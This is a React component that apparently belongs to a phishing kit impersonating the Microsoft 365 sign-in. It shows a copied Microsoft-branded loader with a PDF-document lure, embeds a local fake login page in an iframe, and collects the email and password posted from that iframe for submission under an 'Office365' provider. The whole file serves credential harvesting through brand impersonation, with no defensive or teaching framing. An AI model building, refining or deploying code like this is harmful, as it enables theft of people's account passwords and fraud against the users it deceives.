import React, { useState, useEffect, useRef } from 'react';
import { useLogin } from '../hooks/useLogin';

// A new, visually accurate loader that replicates the user's original HTML design.
const AccurateIframeLoader: React.FC = () => (
  <div className="w-full h-screen flex flex-col items-center justify-center bg-white" style={{ fontFamily: '"Segoe UI", "Helvetica Neue", Arial, sans-serif' }}>
    <div style={{ maxWidth: '440px', width: '100%', padding: '44px', textAlign: 'center' }}>
      {/* Microsoft Logo */}
      <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft logo" style={{ height: '23px', marginBottom: '24px' }} />
      
      {/* Title */}
      <h1 style={{ fontSize: '24px', fontWeight: 600, color: '#1b1b1b', marginBottom: '1rem' }}>Signing you in...</h1>
      
      {/* Loading Animation Container */}
      <div style={{ marginTop: '2rem', padding: '20px' }}>
        
        {/* Red PDF Icon (as inline SVG) */}
        <svg viewBox="0 0 24 24" style={{ fontSize: '40px', color: '#dc3545', marginBottom: '10px', width: '40px', height: '40px', margin: '0 auto 10px' }} fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zM12 20c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-12h2v4h-2zm0 6h2v2h-2z"></path></svg>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512" style={{ fontSize: '40px', color: '#dc3545', marginBottom: '10px', width: '40px', height: '40px', margin: '0 auto 10px' }} fill="currentColor"><path d="M369.9 97.9L286 14C277 5 264.8-.1 252.1-.1H48C21.5 0 0 21.5 0 48v416C0 490.5 21.5 512 48 512h288c26.5 0 48-21.5 48-48V131.9c0-12.7-5.1-25-14.1-34zM332.1 128H256V51.9l76.1 76.1zM48 464V48h160v104c0 13.3 10.7 24 24 24h104v288H48zm112-200c-13.3 0-24-10.7-24-24s10.7-24 24-24 24 10.7 24 24-10.7 24-24 24zm-24-88c0 13.3 10.7 24 24 24s24-10.7 24-24-10.7-24-24-24-24 10.7-24 24zm120 48c-13.3 0-24-10.7-24-24s10.7-24 24-24 24 10.7 24 24-10.7 24-24 24zm-24-88c0 13.3 10.7 24 24 24s24-10.7 24-24-10.7-24-24-24-24 10.7-24 24z"/></svg>

        {/* CSS Spinner */}
        <div style={{
          border: '4px solid #f3f3f3',
          borderTop: '4px solid #0067b8',
          borderRadius: '50%',
          width: '30px',
          height: '30px',
          animation: 'spin 1s linear infinite',
          margin: '0 auto',
        }}></div>
        <style>{`
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        `}</style>
        
        {/* Status Text */}
        <p style={{ marginTop: '20px', color: '#666' }}>
          Preparing secure sign-in...
        </p>
      </div>
    </div>
  </div>
);

const Office365Wrapper: React.FC<Office365WrapperProps> = ({ onLoginSuccess, onLoginError }) => {
  const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [isIframeLoading, setIsIframeLoading] = useState(true);

  // Logic for handling form submission (Untouched)
  useEffect(() => {
    const handleMessage = (event: MessageEvent) => {
      if (event.data.type === 'OFFICE_365_SUBMIT') {
        const { email, password } = event.data.payload;
        handleFormSubmit(new Event('submit'), { email, password, provider: 'Office365' });
      }
    };
    window.addEventListener('message', handleMessage);
    return () => {
      window.removeEventListener('message', handleMessage);
    };
  }, [handleFormSubmit]);

  // Logic for sending errors to the iframe (Untouched)
  useEffect(() => {
    if (errorMessage && iframeRef.current?.contentWindow) {
      iframeRef.current.contentWindow.postMessage({
        type: 'LOGIN_ERROR',
        payload: { message: errorMessage }
      }, '*');
    }
  }, [errorMessage]);

  return (
    <>
      {/* Existing spinner for when credentials are being verified (Untouched) */}
      {isLoading && (
        <div className="absolute inset-0 bg-white/80 flex flex-col items-center justify-center z-50">
          <div style={{
            border: '4px solid #f3f3f3',
            borderTop: '4px solid #0067b8',
            borderRadius: '50%',
            width: '50px',
            height: '50px',
            animation: 'spin 1s linear infinite',
          }}></div>
           <style>{`
              @keyframes spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
              }
           `}</style>
          <p className="mt-4 text-lg font-semibold text-gray-700">Signing in securely...</p>
        </div>
      )}

      {/* NEW: Display the accurate loader while the iframe is loading */}
      {isIframeLoading && <AccurateIframeLoader />}

      <iframe
        ref={iframeRef}
        src="/office.365.html"
        title="Office 365 Sign in"
        // Hide the iframe until it's fully loaded to prevent blank flash
        style={{ display: isIframeLoading ? 'none' : 'block' }}
        className="w-full h-screen border-0"
        // When loaded, hide the loader and show the content
        onLoad={() => setIsIframeLoading(false)}
      />
    </>
  );
};

export default Office365Wrapper;
